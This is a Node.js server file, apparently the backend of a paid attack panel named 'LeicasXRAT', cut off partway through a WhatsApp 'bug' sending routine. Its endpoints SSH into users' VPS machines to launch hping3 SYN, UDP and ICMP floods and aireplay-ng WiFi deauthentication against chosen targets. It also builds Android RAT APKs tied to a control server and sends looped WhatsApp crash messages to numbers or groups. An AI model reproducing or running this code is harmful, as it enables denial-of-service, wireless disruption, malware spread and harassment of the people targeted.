// sedangkan module Socket.IO akan dengan otomatis menangkap request route lainnya seperti '/rat-socket'
// pada server yang sama.
server.on('upgrade', (request, socket, head) => {
    // Check apakah connection mencoba memakai web socket biasa
    const targetUrl = request.url;
    if (targetUrl.startsWith('/ws') || targetUrl === '/') {
        wss.handleUpgrade(request, socket, head, (ws) => {
            wss.emit('connection', ws, request);
        });
    }
    // Jika path bukan target dari WebSocket reguler (misal '/rat-socket' atau '/socket.io/'), 
    // Socket.IO yang ter-attach di Express App akan otomatis menghandlenya
});

const PORT = 2039;

// ===== BODY PARSER SETUP (HARUS SEBELUM ROUTES) =====
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ===== STATIC UPLOADS (gambar global chat) =====
fs.mkdirSync(path.join(__dirname, 'uploads', 'global_chat'), { recursive: true });
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

app.post('/api/ratapi/command-ack', (req, res) => {
    const { commandId } = req.body || {};
    if (!commandId) return res.json({ valid: false, message: 'commandId required' });
    const entry = pendingAcks.get(commandId);
    if (entry) { 
        clearTimeout(entry.timer); 
        pendingAcks.delete(commandId); 
    }
    ratService.updateCommandStatus(commandId, 'completed');
    res.json({ valid: true, message: 'ack' });
});

// ===== Rate Limit Middleware (20 req/detik per token) =====
const rateLimitMap = {};
function rateLimiter(req, res, next) {
  // Skip rate limiting for /api/* endpoints (device registration, heartbeat, etc.)
  if (req.path.startsWith('/api/')) return next();
  
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);


app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*"); // atau ganti * dengan domain spesifik
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData); // ini array

    for (const user of parsed) {
      if (user.sessionKey && user.username && user.lastLogin) {
        const created = new Date(user.lastLogin).getTime();
        const expires = created + 10 * 60 * 1000; // +10 menit

        activeKeys[user.sessionKey] = {
          username: user.username,
          created,
          expires,
        };
      }
    }

    console.log("✅ activeKeys loaded from keyList.json.");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}


function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end(); // Langsung tutup kalau CNC tidak aktif
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      // Jika koneksi putus, reconnect otomatis
      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

// 🚫 Disconnect semua koneksi (misal saat restart)
function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

// Load VPS list saat server pertama kali jalan
if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS(); // Connect ke semua VPS saat server jalan
}

// Pantau perubahan file VPS
fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS(); // Connect ke semua VPS saat server jalan
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

// Middleware: Cek sessionKey dan ambil username
function getUserByKey(key) {
  const keyInfo = activeKeys[key];
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  return user ? keyInfo.username : null;
}

// GET /myServer
app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

// POST /addServer
app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  atomicWrite(VPS_FILE, vpsList);
  res.json({ success: true, message: "VPS added" });
});

// POST /delServer
app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  atomicWrite(VPS_FILE, vpsList);

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

// POST /sendCommand
app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

// POST /test-bug — Test WhatsApp bug (tanpa cooldown)
app.post("/test-bug", (req, res) => {
  const { key, bugId } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  saveUserLog(user.username, "test-bug", `Test Bug: ${bugId}`, `Role: ${user.role}`);
  console.log(`[🧪 TEST-BUG] ${user.username} tested bug: ${bugId}`);
  return res.json({ valid: true, message: `Bug ${bugId} tested successfully` });
});

// GET /cncSend — DDoS flood via user's VPS
app.get("/cncSend", (req, res) => {
  const { key, target, ddos, port, duration } = req.query;
  const owner = getUserByKey(key);
  if (!owner) return res.json({ valid: false, cooldown: false, sended: false });

  const db = loadDatabase();
  const user = db.find(u => u.username === owner);
  if (!user) return res.json({ valid: false, cooldown: false, sended: false });

  // Role-based cooldown
  const roleCooldowns = { member: 300, reseller: 300, vip: 30, admin: 1, owner: 1 };
  const cooldownSeconds = roleCooldowns[user.role] || 60;
  if (!user.lastSend) user.lastSend = 0;
  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    return res.json({ valid: true, sended: false, cooldown: true, wait: cooldownSeconds - diffSeconds });
  }

  user.lastSend = now;
  saveDatabase(db);

  // Response duluan
  res.json({ valid: true, sended: true, cooldown: false });

  // Eksekusi di background
  setImmediate(() => {
    saveUserLog(user.username, "cnc", `CNC Attack: ${target}`, `Type: ${ddos} | Port: ${port} | Duration: ${duration}s`);
    console.log(`[🚀 CNC] ${user.username} → ${target} (${ddos} :${port}, ${duration}s)`);

    const userVPS = vpsList.filter(vps => vps.owner === owner);
    for (const vps of userVPS) {
      const conn = vpsConnections[vps.host];
      if (!conn) continue;

      let command;
      if (ddos === "icmp") {
        command = `screen -dmS flood hping3 --icmp --flood ${target}`;
      } else if (ddos === "udp") {
        command = `screen -dmS flood hping3 --udp -p ${port} --flood ${target}`;
      } else {
        command = `screen -dmS flood hping3 -S -p ${port} --flood ${target}`;
      }
      const killCmd = `sleep ${duration}; pkill -f "screen -dmS flood"`;

      conn.exec(`${command} && ${killCmd}`, (err, stream) => {
        if (err) return console.error(`❌ CNC exec error on ${vps.host}:`, err.message);
        stream.on('close', () => console.log(`✅ CNC done on ${vps.host}`));
      });
    }
  });
});

// GET /killWifi — WiFi deauth attack via VPS
app.get("/killWifi", (req, res) => {
  const { key, target, duration } = req.query;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid key" });

  console.log(`[📶 KILLWIFI] ${owner} → ${target} (${duration}s)`);

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) continue;

    const command = `screen -dmS deauth aireplay-ng --deauth ${duration} -a ${target} wlan0mon`;
    const killCmd = `sleep ${duration}; pkill -f "screen -dmS deauth"`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ KillWifi error on ${vps.host}:`, err.message);
      stream.on('close', () => console.log(`✅ KillWifi done on ${vps.host}`));
    });
  }

  saveUserLog(owner, "killWifi", `Kill WiFi: ${target}`, `Duration: ${duration}s`);
  res.json({ success: true, message: `WiFi attack sent to ${target}` });
});

// GET /getServerInfo — Server info dashboard
app.get("/getServerInfo", (req, res) => {
  const { key } = req.query;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid key" });

  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const cpus = os.cpus();
  const uptimeSec = os.uptime();
  const days = Math.floor(uptimeSec / 86400);
  const hours = Math.floor((uptimeSec % 86400) / 3600);
  const mins = Math.floor((uptimeSec % 3600) / 60);

  const db = loadDatabase();
  let totalUsers = db.length;
  let totalDevices = 0;
  let activeSenders = 0;

  try {
    const targets = fs.existsSync(TARGETS_FILE) ? JSON.parse(fs.readFileSync(TARGETS_FILE)) : [];
    totalDevices = targets.length;
  } catch (_) {}

  try {
    activeSenders = Object.keys(activeConnections).length;
  } catch (_) {}

  res.json({
    valid: true,
    uptime: `${days}d ${hours}h ${mins}m`,
    cpu: `${cpus.length} cores`,
    memory: `${(usedMem / 1073741824).toFixed(1)}GB / ${(totalMem / 1073741824).toFixed(1)}GB`,
    nodeVersion: process.version,
    platform: os.platform(),
    totalUsers,
    totalDevices,
    activeSenders,
    vpsConnected: Object.keys(vpsConnections).length
  });
});

// DELETE /deleteSender — Hapus WhatsApp sender session
app.delete("/deleteSender", (req, res) => {
  const { key, id } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.json({ valid: false, message: "User not found" });

  const sessionPath = path.join("permenmd", user.username, `${id}.json`);
  const vipPath = path.join("vip", `${id}.json`);

  let deleted = false;

  // Hapus dari permenmd/[username]/
  if (fs.existsSync(sessionPath)) {
    try { fs.unlinkSync(sessionPath); deleted = true; } catch (e) {}
  }

  // Hapus dari vip/ (kalau admin/owner)
  if (!deleted && fs.existsSync(vipPath)) {
    try { fs.unlinkSync(vipPath); deleted = true; } catch (e) {}
  }

  // Disconnect dari activeConnections
  if (activeConnections[id]) {
    try { activeConnections[id].end?.(new Error("Deleted by user")); } catch (_) {}
    delete activeConnections[id];
    deleted = true;
  }

  if (deleted) {
    saveUserLog(user.username, "deleteSender", `Delete Sender: ${id}`, "");
    console.log(`[🗑️ DELETE-SENDER] ${user.username} deleted: ${id}`);
    return res.json({ valid: true, message: "Sender deleted" });
  }

  return res.json({ valid: false, message: "Sender not found" });
});


// ============================================================
// APK BUILDER ENDPOINTS
// ============================================================

// GET /api/builder/templates — List available templates
app.get("/api/builder/templates", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });

  const templates = apkBuilder.getTemplateList();
  return res.json({ valid: true, templates });
});

// POST /api/builder/create — Create build config (ratId/kcid auto-set)
app.post("/api/builder/create", (req, res) => {
  const { key, type, appName, packageName, versionCode, versionName, icon, template, customHtml, customUrl } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  // Auto-set ratId (untuk RAT) atau kcid (untuk Kernel)
  if (type === 'rat') {
    if (!user.ratId) {
      user.ratId = generateRatId(user.username);
      saveDatabase(db);
    }
  } else {
    if (!user.kcid) {
      user.kcid = generateKcid();
      saveDatabase(db);
    }
  }

  const buildId = apkBuilder.generateBuildId();
  const config = {
    buildId,
    username: user.username,
    type: type || 'rat',
    ratId: user.ratId || '',
    kcid: user.kcid || '',
    baseUrl: 'http://hamnzx.clouderz.my.id:2000',
    appName: appName || 'MyApp',
    packageName: packageName || 'com.app.custom',
    versionCode: versionCode || 1,
    versionName: versionName || '1.0',
    icon: icon || null,
    template: template || 'blank',
    customHtml: customHtml || '',
    customUrl: customUrl || '',
    createdAt: new Date().toISOString(),
  };

  const buildsDir = path.join(__dirname, 'builds');
  if (!fs.existsSync(buildsDir)) fs.mkdirSync(buildsDir, { recursive: true });
  const buildDir = path.join(buildsDir, buildId);
  if (!fs.existsSync(buildDir)) fs.mkdirSync(buildDir, { recursive: true });

  fs.writeFileSync(path.join(buildDir, 'config.json'), JSON.stringify(config, null, 2));

  console.log(`[APK-BUILDER] Config created: ${buildId} by ${user.username} (type: ${config.type})`);
  return res.json({
    valid: true,
    buildId,
    config: {
      ...config,
      icon: icon ? '(base64 provided)' : null,
      ratId: config.type === 'rat' ? config.ratId : '(kernel mode)',
      kcid: config.type === 'kernel' ? config.kcid : '(rat mode)',
    }
  });
});

// POST /api/builder/build/:id — Trigger build via GitHub Actions
app.post("/api/builder/build/:id", async (req, res) => {
  const { key } = req.body;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });

  const buildId = req.params.id;
  const configPath = path.join(__dirname, 'builds', buildId, 'config.json');
  if (!fs.existsSync(configPath)) return res.status(404).json({ error: "Build not found" });

  const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));

  // Cek status sebelumnya
  const existingStatus = apkBuilder.getBuildStatus(buildId);
  if (existingStatus && existingStatus.status === 'building') {
    return res.json({ valid: true, message: "Build already in progress", buildId });
  }

  // Trigger build async via GitHub Actions
  try {
    const result = await apkBuilder.buildApk(buildId, config);
    if (result.success) {
      return res.json({ valid: true, buildId, status: "building" });
    } else {
      return res.status(500).json({ error: result.error || "Build failed" });
    }
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
});

// GET /api/builder/status/:id — Check build status
app.get("/api/builder/status/:id", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });

  const buildId = req.params.id;
  const status = apkBuilder.getBuildStatus(buildId);
  if (!status) return res.status(404).json({ error: "Build not found" });

  const elapsed = apkBuilder.getElapsedTime(buildId);
  const progress = apkBuilder.getProgress(buildId);

  // Calculate estimated remaining time
  let estimatedRemaining = null;
  if (progress > 0 && progress < 100) {
    const ms = Date.now() - (apkBuilder.buildStartTimes?.[buildId] || Date.now());
    const remainingMs = (ms / progress) * (100 - progress);
    const secs = Math.ceil(remainingMs / 1000);
    estimatedRemaining = `${String(Math.floor(secs / 60)).padStart(2, '0')}:${String(secs % 60).padStart(2, '0')}`;
  }

  return res.json({
    valid: true,
    ...status,
    elapsed,
    progress,
    estimatedRemaining,
    downloadUrl: status.status === 'done' ? apkBuilder.getApkUrl(buildId) : null,
  });
});

// GET /api/builder/logs/:id — SSE realtime logs
app.get("/api/builder/logs/:id", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });

  const buildId = req.params.id;

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('X-Accel-Buffering', 'no');
  res.flushHeaders();

  let lastLogIndex = 0;

  // Send initial connection event
  res.write(`data: ${JSON.stringify({ time: '00:00:00', message: 'Connected to log stream', type: 'info' })}\n\n`);

  // Send existing logs
  const existingLogs = apkBuilder.getLogs(buildId);
  existingLogs.forEach(log => {
    res.write(`data: ${JSON.stringify(log)}\n\n`);
    lastLogIndex++;
  });

  // Poll for new logs every 500ms
  const interval = setInterval(() => {
    const logs = apkBuilder.getLogs(buildId);

    // Send new logs
    while (lastLogIndex < logs.length) {
      res.write(`data: ${JSON.stringify(logs[lastLogIndex])}\n\n`);
      lastLogIndex++;
    }

    // Check if build is done
    const status = apkBuilder.getBuildStatus(buildId);
    if (status && (status.status === 'done' || status.status === 'error')) {
      // Send final status
      if (status.status === 'done') {
        res.write(`data: ${JSON.stringify({
          time: apkBuilder.getElapsedTime(buildId),
          message: 'Build complete! APK ready for download.',
          type: 'success',
          downloadUrl: apkBuilder.getApkUrl(buildId),
        })}\n\n`);
      } else {
        res.write(`data: ${JSON.stringify({
          time: apkBuilder.getElapsedTime(buildId),
          message: `Build failed: ${status.error || 'Unknown error'}`,
          type: 'error',
        })}\n\n`);
      }
      clearInterval(interval);
      res.end();
    }
  }, 500);

  // Cleanup on client disconnect
  req.on('close', () => {
    clearInterval(interval);
  });
});

// GET /api/builder/download/:id — Get download URL
app.get("/api/builder/download/:id", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });

  const buildId = req.params.id;
  const status = apkBuilder.getBuildStatus(buildId);
  if (!status || status.status !== 'done') {
    return res.status(404).json({ error: "APK not ready" });
  }

  const downloadUrl = apkBuilder.getApkUrl(buildId);
  const configPath = path.join(__dirname, 'builds', buildId, 'config.json');
  let filename = 'app.apk';
  if (fs.existsSync(configPath)) {
    const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    filename = `${config.appName || 'app'}_${config.versionName || '1.0'}.apk`;
  }

  return res.json({ valid: true, downloadUrl, filename });
});

// GET /api/builder/apks — List all builds for user
app.get("/api/builder/apks", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const builds = apkBuilder.listBuilds()
    .filter(b => b.username === user.username);

  return res.json({ valid: true, builds });
});


function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  try {
    return JSON.parse(fs.readFileSync(DB_PATH));
  } catch (e) {
    console.error("[⚠️ DB] database.json corrupt, trying backup...");
    const bak = DB_PATH + '.bak';
    if (fs.existsSync(bak)) {
      try { return JSON.parse(fs.readFileSync(bak)); } catch (_) {}
    }
    return [];
  }
}

function saveDatabase(data) {
  const tmp = DB_PATH + '.tmp';
  fs.writeFileSync(tmp, JSON.stringify(data, null, 2));
  if (fs.existsSync(DB_PATH)) fs.copyFileSync(DB_PATH, DB_PATH + '.bak');
  fs.renameSync(tmp, DB_PATH);
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];                // file belum ada / rusak → mulai kosong
  }
}

function saveKeyList(list) {
  atomicWrite(KEY_LIST_FILE, list);
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
  {
    image: "https://files.catbox.moe/cqh4ww.jpg",
    title: "LeicasXRAT",
    desc: "CREDIT BY @Dens_hampa"
  },
  {
    image: "https://files.catbox.moe/cqh4ww.jpg",
    title: "join chenel",
    desc: "CREDIT BY @deniss_erorr78"
  }
];

// ===== Endpoint: Ambil Riwayat Aktivitas User =====
app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      // Jika belum ada log sama sekali, return array kosong
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    // Urutkan dari yang terbaru
    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

// ===== Endpoint: Validate & Login (With Device Lock) =====
app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  // --- LOGIKA CEK PERANGKAT (DEVICE LOCK) ---
  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  // Jika user sudah punya session dan Device ID berbeda dengan yang login sekarang
  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      // KIRIM PESAN ERROR KHUSUS SEHINGGA APLIKASI FLUTTER TAHU
      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }
  // -------------------------------------------

  // Jika sampai sini, berarti:
  // 1. User belum pernah login (existingSession = null)
  // 2. ATAU Device ID sama (Refresh Key)

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    ratId: user.ratId ?? user.owner_id ?? null,
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    ratId: user.ratId ?? user.owner_id ?? null,
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
  const { username, oldPass, newPass } = req.body;
  if (!username || !oldPass || !newPass) {
    return res.json({ success: false, message: "Incomplete data" });
  }

  const db = loadDatabase();
  const idx = db.findIndex(u => u.username === username && u.password === oldPass);
  if (idx === -1) {
    return res.json({ success: false, message: "Invalid credentials" });
  }

  db[idx].password = newPass;
  saveDatabase(db);

  return res.json({ success: true, message: "Password updated successfully" });
});

app.get("/sendBug", async (req, res) => {
  const { key, bug } = req.query;
  let { target } = req.query;

  console.log(`[📤 BUG] Send request for ${target} using key ${key} - Bug: ${bug}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) {
    console.log("[❌ BUG] User tidak ditemukan.");
    return res.json({ valid: false });
  }

  // ===== Role-based Cooldown =====
  const roleCooldowns = {
    member: 300,
    reseller: 300,
    vip: 30,
    admin: 1,
    owner: 1,
  };
  const role = user.role || "member";
  const cooldownSeconds = roleCooldowns[role] || 60;

  if (!user.lastSend) user.lastSend = 0;

  const now = Date.now();
  const diffSeconds = Math.floor((now - user.lastSend) / 1000);
  if (diffSeconds < cooldownSeconds) {
    console.log(`${user.username} Still Cooldown`)
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: cooldownSeconds - diffSeconds,
    });
  }

  // ============ Respon Duluan ============ //
  user.lastSend = now;
  saveDatabase(db);
  console.log(`${user.username} Trigger Cooldown`);

  res.json({
    valid: true,
    sended: true,
    cooldown: false,
    role
  });

  // ============ Kirim Bug di Background ============ //
  setImmediate(async () => {
    saveUserLog(
      user.username,
      "bug",
      `Kirim Bug: ${bug.toUpperCase()}`,
      `Target: ${target} | Role: ${user.role}`
    );

    const isMessBug = false;

    const attemptSend = async (sock, retry = false) => {
      try {
        let targetJid = "";
        const groupRegex = /chat\.whatsapp\.com\/([A-Za-z0-9]+)/;

        if (groupRegex.test(target)) {
          // ... Logic Group (Sama seperti sebelumnya) ...
          const inviteCode = target.match(groupRegex)[1];
          console.log(`[🚀] Mode Group. Invite Code: ${inviteCode}`);

          let groupInfo;
          try {
            groupInfo = await sock.groupGetInviteInfo(inviteCode);
          } catch (e) {
            throw new Error("Invite group invalid / expired");
          }

          targetJid = groupInfo.id;
          console.log(`[👥] Group JID: ${targetJid}`);

          try {
            await sock.groupAcceptInvite(inviteCode);
            console.log(`[✅] Join group success`);
          } catch (e) {
            console.log(`[⚠️] Already joined / join skipped`);
          }

        } else if (target.endsWith("@g.us")) {
          targetJid = target;
          console.log(`[👥] Target Group JID langsung`);

        } else {
          const cleanNumber = target.replace(/\D/g, "");
          targetJid = cleanNumber + "@s.whatsapp.net";
          console.log(`[📞] Mode Nomor: ${targetJid}`);
        }

        // --- KIRIM BUG (Switch Case) ---
        switch (bug) {
          case "ios_crash":
            for (let i = 0; i < 60; i++) {
              
              await iosExe(sock, targetJid);
             }
            break;
           case "02blank":
            for (let i = 0; i < 50; i++) {
              await OrinoxCrashnoclick(sock, targetJid);
              await sleep(100);
            }
            break;
          case "android":
            for (let i = 0; i < 60; i++) {
              await D3nss(client, targetJid);
            }
            break;
          case "04delay":
            for (let i = 0; i < 100; i++) {
              await D3nsskaya(sock, targetJid); 
            }
           break;
          case "01fc":
            for (let i = 0; i < 200; i++) {
              await mentionki(sock, targetJid); 
              await sleep(100);
